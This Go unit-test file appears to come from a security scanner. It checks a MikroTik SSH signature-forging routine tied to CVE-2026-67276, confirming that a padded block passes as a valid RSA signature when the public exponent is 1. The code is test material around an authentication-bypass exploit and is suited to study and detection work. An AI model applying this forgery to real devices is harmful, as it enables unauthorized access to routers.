package cmd

import (
	"crypto/sha256"
	"math/big"
	"testing"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
)

// TestMikrotikEmsaPKCS1v15Shape verifies the EMSA-PKCS1-v1_5 block layout for
// each RSA signature algorithm and that the forged e=1 signature verifies
// (sig^1 mod n == sig) while a 65537 exponent would reject it. This is the
// primitive that CVE-2026-67276 relies on, testable without a target.
func TestMikrotikEmsaPKCS1v15Shape(t *testing.T) {
	// Use a modest 1024-bit modulus so k=128.
	n, ok := new(big.Int).SetString("b10b8f96a080e01dde92de5eae5d54ec52c99fbcfb06a3c69a6a9dca52d23b616073e28675a23d189838ef1e2ee652c013ecb4aea906112324975c3cd49b83bfaccbdd7d90c4bd7098488e9c219a73724effd6fae5644738faa31a4ff55bccc0a151af5f0dc8b4bd45bf37df365c1a65e68cfda76d4da708df1fb2bc2e4a4371", 16)
	if !ok {
		t.Fatalf("failed to parse modulus")
	}

	cases := []struct {
		alg string
	}{
		{ssh.KeyAlgoRSA},
		{ssh.KeyAlgoRSASHA256},
		{ssh.KeyAlgoRSASHA512},
	}

	for _, tc := range cases {
		block, err := mikrotikEmsaPKCS1v15([]byte("auth-data"), tc.alg, 128)
		if err != nil {
			t.Fatalf("%s: %v", tc.alg, err)
		}
		if len(block) != 128 {
			t.Fatalf("%s: block len = %d, want 128", tc.alg, len(block))
		}
		if block[0] != 0x00 || block[1] != 0x01 {
			t.Fatalf("%s: missing 00 01 prefix", tc.alg)
		}
		if block[2] != 0xff {
			t.Fatalf("%s: missing padding", tc.alg)
		}

		// The forged signature is the EMSA block interpreted as an integer.
		sig := new(big.Int).SetBytes(block)
		if sig.Cmp(n) >= 0 {
			t.Fatalf("%s: sig >= n", tc.alg)
		}

		// e=1: sig^1 mod n == sig, so the block round-trips exactly.
		em := new(big.Int).Exp(sig, big.NewInt(1), n)
		padded := make([]byte, 128)
		copy(padded[128-len(em.Bytes()):], em.Bytes())
		if string(padded) != string(block) {
			t.Fatalf("%s: e=1 verify mismatch", tc.alg)
		}

		// e=65537 must NOT reproduce the block (negative control).
		em65537 := new(big.Int).Exp(sig, big.NewInt(65537), n)
		if string(em65537.Bytes()) == string(block) {
			t.Fatalf("%s: e=65537 unexpectedly verified", tc.alg)
		}
	}
}

// TestMikrotikForgeSignerSignature verifies the SignWithAlgorithm output
// encodes the signature as a minimal mpint and preserves the algorithm name.
func TestMikrotikForgeSignerSignature(t *testing.T) {
	n, _ := new(big.Int).SetString("b10b8f96a080e01dde92de5eae5d54ec52c99fbcfb06a3c69a6a9dca52d23b616073e28675a23d189838ef1e2ee652c013ecb4aea906112324975c3cd49b83bfaccbdd7d90c4bd7098488e9c219a73724effd6fae5644738faa31a4ff55bccc0a151af5f0dc8b4bd45bf37df365c1a65e68cfda76d4da708df1fb2bc2e4a4371", 16)

	signer := &mikrotikForgeSigner{pub: nil, n: n}
	sig, err := signer.SignWithAlgorithm(nil, []byte("data"), ssh.KeyAlgoRSASHA256)
	if err != nil {
		t.Fatalf("SignWithAlgorithm: %v", err)
	}
	if sig.Format != ssh.KeyAlgoRSASHA256 {
		t.Fatalf("format = %q, want %q", sig.Format, ssh.KeyAlgoRSASHA256)
	}
	// The blob must start with 0x00 0x01 (the leading zero of the EMSA block
	// is stripped, so the integer begins with 0x01).
	if len(sig.Blob) == 0 || sig.Blob[0] != 0x01 {
		t.Fatalf("signature blob does not start with 0x01: %x", sig.Blob[:8])
	}
	// Blob must be <= k bytes (minimal mpint of a k-byte block).
	if len(sig.Blob) > 128 {
		t.Fatalf("signature blob too long: %d > 128", len(sig.Blob))
	}

	// Sanity: sha256 of data is embedded.
	sum := sha256.Sum256([]byte("data"))
	found := false
	for i := 0; i+len(sum) <= len(sig.Blob); i++ {
		if string(sig.Blob[i:i+len(sum)]) == string(sum[:]) {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("signature blob does not contain SHA-256 digest")
	}
}
